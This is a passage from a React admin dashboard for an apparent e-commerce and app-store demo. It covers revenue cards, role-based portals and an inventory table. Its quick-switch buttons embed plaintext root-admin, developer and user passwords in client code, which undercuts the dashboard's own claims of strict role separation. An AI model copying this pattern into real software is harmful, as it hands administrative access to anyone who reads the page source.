          Category Revenue & Stock Telemetry
        </h2>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {(analytics?.categoryBreakdown || []).map((cat) => {
            const pct = Math.min(100, Math.round((cat.estimatedRevenue / maxCatRevenue) * 100));
            return (
              <div
                key={cat.category}
                className={`rounded-2xl border p-3.5 space-y-2 ${
                  darkMode
                    ? 'border-white/[0.08] bg-slate-950/60'
                    : 'border-slate-200 bg-slate-50'
                }`}
              >
                <div className="flex items-center justify-between text-xs">
                  <span className="font-mono-num uppercase font-bold text-indigo-400">
                    {cat.category}
                  </span>
                  <span className="font-mono-num font-bold">
                    {formatPrice(cat.estimatedRevenue, currency)}
                  </span>
                </div>
                <div
                  className={`h-2 w-full rounded-full overflow-hidden ${
                    darkMode ? 'bg-slate-800' : 'bg-slate-200'
                  }`}
                >
                  <div
                    className="h-full rounded-full bg-gradient-to-r from-indigo-500 to-cyan-400"
                    style={{ width: `${pct}%` }}
                  />
                </div>
                <div className="flex justify-between font-mono-num text-[11px] text-slate-400">
                  <span>{cat.productCount} SKUs</span>
                  <span>{cat.soldCount} sold</span>
                  <span className="text-emerald-400 font-semibold">{cat.stockCount} in stock</span>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Active 3-Tier RBAC Identity, Profile Image File Uploader & Portal Separation Bar */}
      <div className="rounded-3xl p-4 sm:p-5 theme-card border border-indigo-500/35 space-y-4">
        <div className="flex flex-wrap items-center justify-between gap-4">
          <div className="flex items-center gap-3.5">
            <div className="relative h-14 w-14 rounded-2xl bg-indigo-500/20 border border-indigo-500/40 flex items-center justify-center overflow-hidden shrink-0">
              {isCustomImageSource(activeAccount.avatar) ? (
                <img
                  src={activeAccount.avatar}
                  alt={activeAccount.display_name}
                  className="h-full w-full object-cover"
                />
              ) : (
                <span className="text-2xl">{activeAccount.avatar || '🛡️'}</span>
              )}
            </div>
            <div>
              <div className="flex flex-wrap items-center gap-2">
                <span className="font-mono-num text-[10px] font-bold uppercase text-cyan-400">
                  ACTIVE 3-TIER RBAC SESSION ({activeAccount.source || '.env'}):
                </span>
                <span className="font-display text-sm sm:text-base font-bold">
                  {activeAccount.display_name}
                </span>
                <span
                  className={`rounded-lg px-2.5 py-0.5 font-mono-num text-[10px] font-bold uppercase ${
                    activeAccount.role === 'admin'
                      ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
                      : activeAccount.role === 'developer'
                      ? 'bg-indigo-500/20 text-indigo-300 border border-indigo-500/40'
                      : 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
                  }`}
                >
                  {activeAccount.role === 'admin'
                    ? 'TIER 1: ROOT ADMIN SYSTEM (.env • UNRESTRICTED *)'
                    : activeAccount.role === 'developer'
                    ? 'TIER 2: DEVELOPER PORTAL (OWN APPS & CLOUD ONLY)'
                    : 'TIER 3: SYSTEM USER PORTAL (BUYER & ACCOUNT ONLY)'}
                </span>
              </div>
              <p className="text-xs theme-text-muted mt-0.5">
                {activeAccount.role === 'admin'
                  ? 'Authenticated via .env (NEX_ADMIN_USERNAME / NEX_ADMIN_PASSWORD) — Strictly separated Root Admin System with global store, WAF, & account governance.'
                  : activeAccount.role === 'developer'
                  ? `Scoped Developer @${activeAccount.username} — Separated from Root Admin System. Can publish/update own apps & scale own cloud deployments only.`
                  : `Normal System User @${activeAccount.username} — Separated from Root Admin & Developer systems. Scoped to personal profile, orders, installed apps & security reports.`}
              </p>

              {/* Direct Profile Image File Upload (Zero-Canvas FileReader) */}
              <div className="mt-2 flex flex-wrap items-center gap-2">
                <label className="inline-flex items-center gap-1.5 rounded-xl bg-indigo-500/20 hover:bg-indigo-500/30 border border-indigo-500/40 px-3 py-1 font-mono-num text-[11px] font-bold text-indigo-300 cursor-pointer transition">
                  <Upload className="h-3.5 w-3.5" />
                  <span>{uploadingAvatar ? 'Uploading Image...' : 'Upload Profile Image File'}</span>
                  <input
                    type="file"
                    accept="image/*"
                    onChange={(e) => handleUploadActiveProfileImageFile(e.target.files)}
                    className="hidden"
                  />
                </label>
                <div className="flex items-center gap-1">
                  <input
                    type="url"
                    value={profileAvatarUrlDraft}
                    onChange={(e) => setProfileAvatarUrlDraft(e.target.value)}
                    placeholder="Or paste image URL (https://...)"
                    className="rounded-xl px-2.5 py-1 text-[11px] font-mono-num theme-input w-48"
                  />
                  <button
                    type="button"
                    onClick={handleSaveActiveProfileImageUrl}
                    className="rounded-xl bg-emerald-500/20 hover:bg-emerald-500/30 border border-emerald-500/40 px-2.5 py-1 font-mono-num text-[10px] font-bold text-emerald-300 cursor-pointer"
                  >
                    Save Photo
                  </button>
                </div>
                {isCustomImageSource(activeAccount.avatar) && (
                  <span className="font-mono-num text-[10px] text-emerald-400">
                    ✓ Real Image File Active (Zero-Canvas)
                  </span>
                )}
              </div>
            </div>
          </div>

          <div className="flex flex-col items-end gap-1.5">
            <span className="font-mono-num text-[10px] uppercase text-slate-400">
              Switch Separated System Role:
            </span>
            <div className="flex flex-wrap items-center gap-1.5">
              <button
                type="button"
                onClick={() =>
                  handleQuickSwitchAccount(
                    'nex_root_admin',
                    'NEX-Root-Admin-2026!#',
                    'admin',
                    'inventory'
                  )
                }
                className={`rounded-xl px-3 py-1.5 font-mono-num text-[11px] font-bold cursor-pointer transition ${
                  activeAccount.role === 'admin'
                    ? 'bg-emerald-500 text-slate-950 shadow-sm'
                    : 'theme-subtle hover:border-emerald-400'
                }`}
              >
                🛡️ Root Admin (.env)
              </button>
              <button
                type="button"
                onClick={() =>
                  handleQuickSwitchAccount(
                    'aether_labs',
                    'DevPass2026!',
                    'developer',
                    'developer-portal'
                  )
                }
                className={`rounded-xl px-3 py-1.5 font-mono-num text-[11px] font-bold cursor-pointer transition ${
                  activeAccount.username === 'aether_labs'
                    ? 'bg-indigo-600 text-white shadow-sm'
                    : 'theme-subtle hover:border-indigo-400'
                }`}
              >
                👩‍💻 Dev: @aether_labs
              </button>
              <button
                type="button"
                onClick={() =>
                  handleQuickSwitchAccount(
                    'rustcore_sys',
                    'RustCore2026!',
                    'developer',
                    'developer-portal'
                  )
                }
                className={`rounded-xl px-3 py-1.5 font-mono-num text-[11px] font-bold cursor-pointer transition ${
                  activeAccount.username === 'rustcore_sys'
                    ? 'bg-cyan-600 text-white shadow-sm'
                    : 'theme-subtle hover:border-cyan-400'
                }`}
              >
                🦀 Dev: @rustcore_sys
              </button>
              <button
                type="button"
                onClick={() =>
                  handleQuickSwitchAccount(
                    'amara_nbo',
                    'Shopper2026!',
                    'user',
                    'user-portal'
                  )
                }
                className={`rounded-xl px-3 py-1.5 font-mono-num text-[11px] font-bold cursor-pointer transition ${
                  activeAccount.role === 'user'
                    ? 'bg-amber-500 text-slate-950 shadow-sm'
                    : 'theme-subtle hover:border-amber-400'
                }`}
              >
                👤 User: @amara_nbo
              </button>
            </div>
          </div>
        </div>

        {authFeedback && (
          <div
            className={`rounded-2xl px-3.5 py-2 text-xs font-mono-num flex items-center justify-between ${
              authFeedback.type === 'error'
                ? 'bg-rose-500/15 border border-rose-500/40 text-rose-300'
                : 'bg-emerald-500/15 border border-emerald-500/40 text-emerald-300'
            }`}
          >
            <span>{authFeedback.message}</span>
            <button
              type="button"
              onClick={() => setAuthFeedback(null)}
              className="text-[10px] underline cursor-pointer ml-3"
            >
              Dismiss
            </button>
          </div>
        )}
      </div>

      {/* Section Sub-Navigation Tabs (Overview + Separated Admin / Developer / User Portals) */}
      <div className="flex flex-wrap items-center gap-2">
        {[
          { id: 'overview', label: 'Overview Dashboard (Connected)', icon: Activity, tier: 'all' },
          { id: 'developer-portal', label: 'Developer Portal (Scoped)', icon: Terminal, tier: 'developer' },
          { id: 'user-portal', label: 'System User Portal', icon: Users, tier: 'user' },
          { id: 'auth-rbac', label: `3-Tier RBAC & Profiles (${resolvedAccounts.length + 1})`, icon: Lock, tier: 'all' },
          { id: 'inventory', label: `[Admin] Product & Stock (${products.length})`, icon: Package, tier: 'admin' },
          { id: 'hosting', label: `[Admin] Cloud Hosting (${resolvedDeployments.length})`, icon: Globe, tier: 'admin' },
          { id: 'security-firewall', label: `[Admin] WAF & IP Block (${resolvedBlockedIps.length})`, icon: ShieldAlert, tier: 'admin' },
          { id: 'payments', label: `[Admin] Payments (${resolvedPayments.length})`, icon: CreditCard, tier: 'admin' },
          { id: 'orders', label: `[Admin] Orders (${orders.length})`, icon: Truck, tier: 'admin' },
          { id: 'coupons', label: `[Admin] Coupons (${coupons.length})`, icon: Tag, tier: 'admin' },
          { id: 'logs', label: `[Admin] Audit Logs (${inventoryLogs.length})`, icon: History, tier: 'admin' },
          { id: 'test-suites', label: `[Admin] Automated Tests (6 Suites)`, icon: ShieldCheck, tier: 'admin' }
        ].map((tab) => {
          const Icon = tab.icon;
          const active = adminSection === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => setAdminSection(tab.id)}
              className={`flex items-center gap-2 rounded-xl px-4 py-2.5 text-xs font-semibold transition cursor-pointer ${
                active
                  ? 'bg-gradient-to-r from-indigo-600 to-indigo-500 text-white shadow-md shadow-indigo-500/25'
                  : darkMode
                  ? 'bg-slate-900 border border-white/[0.08] text-slate-300 hover:text-white'
                  : 'bg-white border border-slate-200 text-slate-700 hover:bg-slate-100'
              }`}
            >
              <Icon className="h-3.5 w-3.5" />
              <span>{tab.label}</span>
            </button>
          );
        })}
      </div>

      {/* 0. CONNECTED OVERVIEW DASHBOARD (`adminSection === 'overview'`) */}
      {adminSection === 'overview' && (
        <div className="space-y-6">
          <div className="rounded-3xl p-6 theme-card border border-cyan-500/35 space-y-5">
            <div className="flex flex-wrap items-center justify-between gap-4">
              <div>
                <div className="inline-flex items-center gap-2 rounded-full bg-cyan-500/15 border border-cyan-500/35 px-3 py-0.5 font-mono-num text-[11px] font-bold text-cyan-400">
                  <Activity className="h-3.5 w-3.5" />
                  <span>LIVE ECOSYSTEM OVERVIEW TELEMETRY • GET /api/overview/dashboard</span>
                </div>
                <h2 className="font-display text-xl sm:text-2xl font-bold mt-1.5">
                  NEX Store Unified Ecosystem Overview &amp; Quick-Launch Hub
                </h2>
                <p className="text-xs theme-text-muted mt-0.5">
                  Real-time telemetry connecting Storefront Hardware SKUs, Sandbox App Registry, 28-Table SQLite + MongoDB Atlas Studio, 10 Subsystem Nodes, and 3-Tier RBAC Portals.
                </p>
              </div>
              <button
                type="button"
                onClick={fetchOverviewDashboard}
                className="inline-flex items-center gap-2 rounded-2xl bg-cyan-500/15 hover:bg-cyan-500/25 border border-cyan-500/40 px-4 py-2.5 font-mono-num text-xs font-bold text-cyan-300 cursor-pointer transition"
              >
                <RefreshCw className="h-3.5 w-3.5" />
                <span>Sync Live Overview</span>
              </button>
            </div>

            {/* 6 Connected Ecosystem Telemetry Cards with Direct Navigation */}
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
              <div className="rounded-2xl p-4 theme-subtle border border-indigo-500/25 flex flex-col justify-between gap-3">
                <div>
                  <div className="flex items-center justify-between font-mono-num text-[10px] uppercase text-indigo-400 font-bold">
                    <span>1. Hardware Storefront &amp; SKUs</span>
                    <Package className="h-4 w-4" />
                  </div>
                  <div className="font-display text-2xl font-bold mt-1">
                    {overviewData?.analytics?.totalProducts ?? products.length} SKUs •{' '}
                    {overviewData?.analytics?.totalUnitsInStock ?? analytics?.totalUnitsInStock ?? 0} in stock
                  </div>
                  <p className="text-xs theme-text-muted mt-1">
                    Gross revenue {formatPrice(overviewData?.analytics?.totalRevenue ?? analytics?.totalRevenue ?? 0, currency)} across {overviewData?.analytics?.totalOrders ?? orders.length} orders.
                  </p>
                </div>
                <div className="flex flex-wrap gap-2">
                  <button
                    type="button"
                    onClick={() => onNavigateTab?.('storefront')}
                    className="rounded-xl bg-indigo-600 hover:bg-indigo-500 px-3 py-1.5 font-mono-num text-[11px] font-bold text-white cursor-pointer"
                  >
                    Open Storefront →
                  </button>
                  <button
                    type="button"
                    onClick={() => setAdminSection('inventory')}
                    className="rounded-xl theme-card px-3 py-1.5 font-mono-num text-[11px] font-bold cursor-pointer"
                  >
                    Manage Stock
                  </button>
                </div>
              </div>

              <div className="rounded-2xl p-4 theme-subtle border border-cyan-500/25 flex flex-col justify-between gap-3">
                <div>
                  <div className="flex items-center justify-between font-mono-num text-[10px] uppercase text-cyan-400 font-bold">
                    <span>2. App Store &amp; Live Sandboxes</span>
                    <Terminal className="h-4 w-4" />
                  </div>
                  <div className="font-display text-2xl font-bold mt-1">
                    {overviewData?.appsSummary?.totalApps ?? apps.length} Apps •{' '}
                    {overviewData?.appsSummary?.installedAppsCount ?? appInstalls.length} Installed
                  </div>
                  <p className="text-xs theme-text-muted mt-1">
                    {(overviewData?.appsSummary?.totalDownloads ?? 98400).toLocaleString()} total downloads across 9 interactive sandbox runtime engines.
                  </p>
                </div>
                <div className="flex flex-wrap gap-2">
                  <button
                    type="button"
                    onClick={() => onNavigateTab?.('apps')}
                    className="rounded-xl bg-cyan-500 hover:bg-cyan-400 px-3 py-1.5 font-mono-num text-[11px] font-bold text-slate-950 cursor-pointer"
                  >
                    Launch App Store →
                  </button>
                  <button
                    type="button"
                    onClick={() => setAdminSection('developer-portal')}
                    className="rounded-xl theme-card px-3 py-1.5 font-mono-num text-[11px] font-bold cursor-pointer"
                  >
                    Developer Portal
                  </button>
                </div>
              </div>

              <div className="rounded-2xl p-4 theme-subtle border border-emerald-500/25 flex flex-col justify-between gap-3">
                <div>
                  <div className="flex items-center justify-between font-mono-num text-[10px] uppercase text-emerald-400 font-bold">
                    <span>3. SQLite + MongoDB Atlas Studio</span>
                    <Database className="h-4 w-4" />
                  </div>
                  <div className="font-display text-2xl font-bold mt-1">
                    {overviewData?.dbOverview?.tableCount ?? dbStats?.tableCount ?? 28} Tables •{' '}
                    {overviewData?.dbOverview?.totalRows ?? dbStats?.totalRows ?? 160}+ Rows
                  </div>
                  <p className="text-xs theme-text-muted mt-1">
                    Dual-engine persistence: SQLite WAL ({overviewData?.dbOverview?.engine || 'SQLite 3'}) + MongoDB Atlas BSON cluster.
                  </p>
                </div>
                <div className="flex flex-wrap gap-2">
                  <button
                    type="button"
                    onClick={() => onNavigateTab?.('database')}
                    className="rounded-xl bg-emerald-500 hover:bg-emerald-400 px-3 py-1.5 font-mono-num text-[11px] font-bold text-slate-950 cursor-pointer"
                  >
                    Open DB Studio →
                  </button>
                  <button
                    type="button"
                    onClick={() => onNavigateTab?.('docs')}
                    className="rounded-xl theme-card px-3 py-1.5 font-mono-num text-[11px] font-bold cursor-pointer"
                  >
                    Architecture Docs
                  </button>
                </div>
              </div>

              <div className="rounded-2xl p-4 theme-subtle border border-amber-500/25 flex flex-col justify-between gap-3">
                <div>
                  <div className="flex items-center justify-between font-mono-num text-[10px] uppercase text-amber-400 font-bold">
                    <span>4. 10 Subsystem Nodes &amp; Mesh</span>
                    <Server className="h-4 w-4" />
                  </div>
                  <div className="font-display text-2xl font-bold mt-1">
                    {overviewData?.subsystemsSummary?.onlineNodes ?? serverNodes.length ?? 6}/
                    {overviewData?.subsystemsSummary?.totalNodes ?? serverNodes.length ?? 6} Nodes Online
                  </div>
                  <p className="text-xs theme-text-muted mt-1">
                    Avg CPU {overviewData?.subsystemsSummary?.avgCpuLoad ?? 32}% • {overviewData?.subsystemsSummary?.hostingDeploymentsCount ?? resolvedDeployments.length} multi-cloud deployments.
                  </p>
                </div>
                <div className="flex flex-wrap gap-2">
                  <button
                    type="button"
                    onClick={() => onNavigateTab?.('subsystems')}
                    className="rounded-xl bg-amber-500 hover:bg-amber-400 px-3 py-1.5 font-mono-num text-[11px] font-bold text-slate-950 cursor-pointer"
                  >
                    Open Subsystems →
                  </button>
                  <button
                    type="button"
                    onClick={() => onNavigateTab?.('rig-builder')}
                    className="rounded-xl theme-card px-3 py-1.5 font-mono-num text-[11px] font-bold cursor-pointer"
                  >
                    5-Slot Rig Builder
                  </button>
                </div>
              </div>

              <div className="rounded-2xl p-4 theme-subtle border border-purple-500/25 flex flex-col justify-between gap-3">
                <div>
                  <div className="flex items-center justify-between font-mono-num text-[10px] uppercase text-purple-400 font-bold">
                    <span>5. 3-Tier Admin / Dev / User RBAC</span>
                    <Lock className="h-4 w-4" />
                  </div>
                  <div className="font-display text-2xl font-bold mt-1">
                    1 Root (.env) • {overviewData?.accountsSummary?.developerCount ?? 2} Devs •{' '}
                    {overviewData?.accountsSummary?.systemUserCount ?? 1} Users
                  </div>
                  <p className="text-xs theme-text-muted mt-1">
                    Strict backend &amp; UI separation between `.env` Root Admin, Scoped Developers, and System Users.
                  </p>
                </div>
                <div className="flex flex-wrap gap-2">
                  <button
                    type="button"
                    onClick={() => setAdminSection('auth-rbac')}
                    className="rounded-xl bg-purple-600 hover:bg-purple-500 px-3 py-1.5 font-mono-num text-[11px] font-bold text-white cursor-pointer"
                  >
                    3-Tier RBAC Studio →
                  </button>
                  <button
                    type="button"
                    onClick={() => setAdminSection('user-portal')}
                    className="rounded-xl theme-card px-3 py-1.5 font-mono-num text-[11px] font-bold cursor-pointer"
                  >
                    User Portal
                  </button>
                </div>
              </div>

              <div className="rounded-2xl p-4 theme-subtle border border-rose-500/25 flex flex-col justify-between gap-3">
                <div>
                  <div className="flex items-center justify-between font-mono-num text-[10px] uppercase text-rose-400 font-bold">
                    <span>6. WAF, XSS Shield &amp; Test Suites</span>
                    <ShieldCheck className="h-4 w-4" />
                  </div>
                  <div className="font-display text-2xl font-bold mt-1">
                    {overviewData?.subsystemsSummary?.blockedIpsCount ?? resolvedBlockedIps.length} Blocked IPs • 6 Suites
                  </div>
                  <p className="text-xs theme-text-muted mt-1">
                    Zero-canvas image upload validator, XSS firewall, &amp; live automated verification runner.
                  </p>
                </div>
                <div className="flex flex-wrap gap-2">
                  <button
                    type="button"
                    onClick={() => setAdminSection('security-firewall')}
                    className="rounded-xl bg-rose-600 hover:bg-rose-500 px-3 py-1.5 font-mono-num text-[11px] font-bold text-white cursor-pointer"
                  >
                    WAF &amp; Security →
                  </button>
                  <button
                    type="button"
                    onClick={() => setAdminSection('test-suites')}
                    className="rounded-xl theme-card px-3 py-1.5 font-mono-num text-[11px] font-bold cursor-pointer"
                  >
                    Run Test Suites
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* SCOPED DEVELOPER PORTAL (`adminSection === 'developer-portal'`) — SEPARATED FROM ROOT ADMIN & NORMAL USERS */}
      {adminSection === 'developer-portal' && (
        <div className="space-y-6">
          <div className="rounded-3xl p-6 theme-card border border-indigo-500/40 space-y-4">
            <div className="flex flex-wrap items-center justify-between gap-3">
              <div>
                <div className="font-mono-num text-[10px] font-bold uppercase text-indigo-400">
                  TIER 2: ISOLATED DEVELOPER PORTAL • SCOPED TO @{activeAccount.username}
                </div>
                <h2 className="font-display text-xl font-bold mt-1">
                  Developer App Publishing, Sandbox Telemetry &amp; Scoped Cloud Instances
                </h2>
                <p className="text-xs theme-text-muted mt-0.5">
                  Separated from Root Admin System (.env) and normal buyer accounts. Developers can manage their own published apps, upload developer profile images, and scale their own cloud instances.
                </p>
              </div>
              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => onNavigateTab?.('apps')}
                  className="rounded-xl bg-indigo-600 hover:bg-indigo-500 px-4 py-2 font-mono-num text-xs font-bold text-white cursor-pointer"
                >
                  Publish / Edit Apps in App Store →
                </button>
              </div>
            </div>

            {devProgress && (
              <div className="space-y-4">
                <div className="grid grid-cols-2 sm:grid-cols-5 gap-3">
                  <div className="rounded-2xl p-3.5 theme-subtle">
                    <div className="font-mono-num text-[10px] uppercase theme-text-muted">My Published Apps</div>
                    <div className="font-mono-num text-2xl font-bold text-indigo-400">
                      {devProgress.summary?.publishedAppsCount || 0}
                    </div>
                  </div>
                  <div className="rounded-2xl p-3.5 theme-subtle">
                    <div className="font-mono-num text-[10px] uppercase theme-text-muted">Total Downloads</div>
                    <div className="font-mono-num text-2xl font-bold text-emerald-400">
                      {(devProgress.summary?.totalDownloads || 0).toLocaleString()}
                    </div>
                  </div>
                  <div className="rounded-2xl p-3.5 theme-subtle">
                    <div className="font-mono-num text-[10px] uppercase theme-text-muted">Active Sandbox Mounts</div>
                    <div className="font-mono-num text-2xl font-bold text-cyan-400">
                      {devProgress.summary?.activeSandboxInstalls || 0}
                    </div>
                  </div>
                  <div className="rounded-2xl p-3.5 theme-subtle">
                    <div className="font-mono-num text-[10px] uppercase theme-text-muted">My Cloud Instances</div>
                    <div className="font-mono-num text-2xl font-bold text-amber-400">
                      {devProgress.summary?.activeCloudInstances || 0}
                    </div>
                  </div>
                  <div className="rounded-2xl p-3.5 theme-subtle">
                    <div className="font-mono-num text-[10px] uppercase theme-text-muted">Avg Security Score</div>
                    <div className="font-mono-num text-2xl font-bold text-emerald-400">
                      {devProgress.summary?.avgSecurityScore || 99}/100
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="rounded-2xl p-4 theme-subtle space-y-2.5">
                    <div className="font-mono-num text-xs font-bold uppercase text-indigo-400">
                      Scoped Developer Apps ({devProgress.apps?.length || 0})
                    </div>
                    {(devProgress.apps || []).map((a) => (
                      <div key={a.id} className="flex items-center justify-between rounded-xl p-2.5 theme-card text-xs">
                        <div className="flex items-center gap-2.5">
                          {isCustomImageSource(a.icon) ? (
                            <img src={a.icon} alt={a.name} className="h-8 w-8 rounded-lg object-cover" />
                          ) : (
                            <span className="text-lg">{a.icon || '⚡'}</span>
                          )}
                          <div>
                            <div className="font-bold">{a.name}</div>
                            <div className="font-mono-num text-[10px] theme-text-muted">
                              v{a.version} • {(a.downloads || 0).toLocaleString()} DLs • {a.rating}★
                            </div>
                          </div>
                        </div>
                        <span className="rounded-lg bg-emerald-500/15 px-2 py-0.5 font-mono-num text-[10px] font-bold text-emerald-400">
                          {a.installed ? 'MOUNTED' : 'PUBLISHED'}
                        </span>
                      </div>
                    ))}
                  </div>

                  <div className="rounded-2xl p-4 theme-subtle space-y-2.5">
                    <div className="font-mono-num text-xs font-bold uppercase text-cyan-400">
                      Scoped Cloud Deployments ({devProgress.deployments?.length || 0})
                    </div>
                    {(devProgress.deployments || []).map((dep) => (
                      <div key={dep.id} className="flex items-center justify-between rounded-xl p-2.5 theme-card text-xs">
                        <div>
                          <div className="font-bold">{dep.app_name}</div>
                          <div className="font-mono-num text-[10px] theme-text-muted">
                            {dep.provider} • {dep.region} • {dep.current_instances}/{dep.max_instances} instances
                          </div>
                        </div>
                        <div className="flex items-center gap-1">
                          <button
                            type="button"
                            onClick={() => handleScaleHosting(dep, -1)}
                            className="rounded-lg px-2 py-1 font-mono-num text-[10px] font-bold theme-subtle cursor-pointer"
                          >
                            -1
                          </button>
                          <button
                            type="button"
                            onClick={() => handleScaleHosting(dep, 1)}
                            className="rounded-lg px-2 py-1 font-mono-num text-[10px] font-bold theme-subtle cursor-pointer"
                          >
                            +1
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* NORMAL SYSTEM USER PORTAL (`adminSection === 'user-portal'`) — SEPARATED FROM ROOT ADMIN & DEVELOPERS */}
      {adminSection === 'user-portal' && (
        <div className="space-y-6">
          <div className="rounded-3xl p-6 theme-card border border-amber-500/40 space-y-5">
            <div className="flex flex-wrap items-center justify-between gap-3">
              <div>
                <div className="font-mono-num text-[10px] font-bold uppercase text-amber-400">
                  TIER 3: NORMAL SYSTEM USER PORTAL • GET /api/user/my-dashboard?username={activeAccount.username}
                </div>
                <h2 className="font-display text-xl font-bold mt-1">
                  Personal Buyer Account, Orders, Installed Apps &amp; Profile Photo Studio
                </h2>
                <p className="text-xs theme-text-muted mt-0.5">
                  Strictly separated from Root Admin System (.env) and Developer publishing pipelines. Normal system users manage their profile image, hardware orders, installed sandbox apps, and security reports.
                </p>
              </div>
              <button
                type="button"
                onClick={() => fetchUserDashboard(activeAccount.username)}
                className="rounded-xl bg-amber-500/20 hover:bg-amber-500/30 border border-amber-500/40 px-4 py-2 font-mono-num text-xs font-bold text-amber-300 cursor-pointer"
              >
                Refresh My Account
              </button>
            </div>

            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
              <div className="rounded-2xl p-3.5 theme-subtle">
                <div className="font-mono-num text-[10px] uppercase theme-text-muted">My Orders</div>
                <div className="font-mono-num text-2xl font-bold text-amber-400">
                  {userDashboardData?.summary?.ordersCount ?? orders.length}
                </div>
              </div>
              <div className="rounded-2xl p-3.5 theme-subtle">
                <div className="font-mono-num text-[10px] uppercase theme-text-muted">Installed Apps</div>
                <div className="font-mono-num text-2xl font-bold text-cyan-400">
                  {userDashboardData?.summary?.installedAppsCount ?? appInstalls.length}
                </div>
              </div>
              <div className="rounded-2xl p-3.5 theme-subtle">
                <div className="font-mono-num text-[10px] uppercase theme-text-muted">Subscriptions</div>
                <div className="font-mono-num text-2xl font-bold text-emerald-400">
                  {userDashboardData?.summary?.activeSubscriptionsCount ?? 3}
                </div>
              </div>
              <div className="rounded-2xl p-3.5 theme-subtle">
                <div className="font-mono-num text-[10px] uppercase theme-text-muted">Security Reports</div>
                <div className="font-mono-num text-2xl font-bold text-indigo-400">
                  {userDashboardData?.summary?.submittedReportsCount ?? 1}
                </div>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="rounded-2xl p-4 theme-subtle space-y-2.5">
                <div className="font-mono-num text-xs font-bold uppercase text-amber-400">
                  Recent Hardware Orders
                </div>
                {(userDashboardData?.orders || orders.slice(0, 4)).map((o) => (
                  <div key={o.id} className="flex items-center justify-between rounded-xl p-2.5 theme-card text-xs">
                    <div>
                      <div className="font-mono-num font-bold text-indigo-400">#{o.order_number}</div>
                      <div className="text-[11px] theme-text-muted">{o.customer_name} • {o.status.toUpperCase()}</div>
                    </div>
                    <div className="font-mono-num font-bold text-emerald-400">
                      {formatPrice(o.total || 0, currency)}
                    </div>
                  </div>
                ))}
              </div>

              <div className="rounded-2xl p-4 theme-subtle space-y-2.5">
                <div className="font-mono-num text-xs font-bold uppercase text-cyan-400">
                  Mounted Sandbox Applications
                </div>
                {(userDashboardData?.installedApps || appInstalls.slice(0, 4)).map((inst) => (
                  <div key={inst.id || inst.app_id} className="flex items-center justify-between rounded-xl p-2.5 theme-card text-xs">
                    <div>
                      <div className="font-bold">{inst.name || inst.app_id}</div>
                      <div className="font-mono-num text-[10px] theme-text-muted">
                        Container: {inst.sandbox_container_id || 'sbx-isolated'}
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => onNavigateTab?.('apps')}
                      className="rounded-lg bg-cyan-500/15 border border-cyan-500/35 px-2.5 py-1 font-mono-num text-[10px] font-bold text-cyan-300 cursor-pointer"
                    >
                      Open App →
                    </button>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ROOT ADMIN SYSTEM (.env) RBAC ISOLATION BANNER WHEN NON-ADMIN VIEWS ADMIN TABS */}
      {activeAccount.role !== 'admin' &&
        ['inventory', 'hosting', 'security-firewall', 'payments', 'orders', 'coupons', 'logs', 'test-suites'].includes(
          adminSection
        ) && (
          <div className="rounded-3xl p-5 bg-rose-500/10 border border-rose-500/40 flex flex-wrap items-center justify-between gap-4">
            <div className="space-y-1">
              <div className="font-mono-num text-xs font-bold uppercase text-rose-400">
                🔒 ROOT ADMIN SYSTEM (.ENV) ISOLATION GUARD ACTIVE — CURRENT ROLE: {activeAccount.role.toUpperCase()}
              </div>
              <p className="text-xs text-slate-300">
                The Root Admin System is strictly separated from normal Developers (<code>role: developer</code>) and System Users (<code>role: user</code>). Root mutations require <code>.env</code> Root Admin credentials.
              </p>
            </div>
            <div className="flex flex-wrap items-center gap-2">
              <button
                type="button"
                onClick={() =>
                  setAdminSection(activeAccount.role === 'developer' ? 'developer-portal' : 'user-portal')
                }
                className="rounded-xl bg-indigo-600 hover:bg-indigo-500 px-3.5 py-2 font-mono-num text-xs font-bold text-white cursor-pointer"
              >
                Go to My {activeAccount.role === 'developer' ? 'Developer' : 'User'} Portal →
              </button>
              <button
                type="button"
                onClick={() =>
                  handleQuickSwitchAccount('nex_root_admin', 'NEX-Root-Admin-2026!#', 'admin')
                }
                className="rounded-xl bg-emerald-500 hover:bg-emerald-400 px-3.5 py-2 font-mono-num text-xs font-bold text-slate-950 cursor-pointer"
              >
                Authenticate as Root Admin (.env)
              </button>
            </div>
          </div>
        )}

      {/* 1. Product & Stock Control Table */}
      {adminSection === 'inventory' && (
        <div className={`overflow-x-auto rounded-3xl ${cardSurface}`}>
          <table className="w-full text-left text-xs">
            <thead
              className={`border-b font-mono-num uppercase text-[11px] text-slate-400 ${
                darkMode
                  ? 'border-white/[0.08] bg-slate-950/60'
                  : 'border-slate-200 bg-slate-100/80'
              }`}
            >
              <tr>
                <th className="p-4">Hardware SKU & Model</th>
                <th className="p-4">Category</th>
                <th className="p-4">Price</th>
                <th className="p-4">Live Stock (Real-Time Adjust)</th>
                <th className="p-4">Flash Deal</th>
                <th className="p-4 text-right">Actions</th>
              </tr>
            </thead>
            <tbody
              className={`divide-y ${
                darkMode ? 'divide-white/[0.06]' : 'divide-slate-200'
              }`}
            >
              {products.map((prod) => {
                const isLow = prod.stock <= prod.low_stock_threshold;
                return (
                  <tr
                    key={prod.id}
                    className={
                      darkMode ? 'hover:bg-slate-800/30' : 'hover:bg-slate-100/60'
                    }
                  >
                    <td className="p-4">
                      <div className="flex items-center gap-3">
                        <img
                          src={getProductArtUrl(prod, { view: 'hero' })}
                          alt={prod.name}
                          className="h-12 w-16 rounded-xl object-contain bg-slate-950 shrink-0"
                        />
                        <div>
                          <div className="font-mono-num text-[10px] font-bold text-indigo-400">
                            {prod.sku}
                          </div>
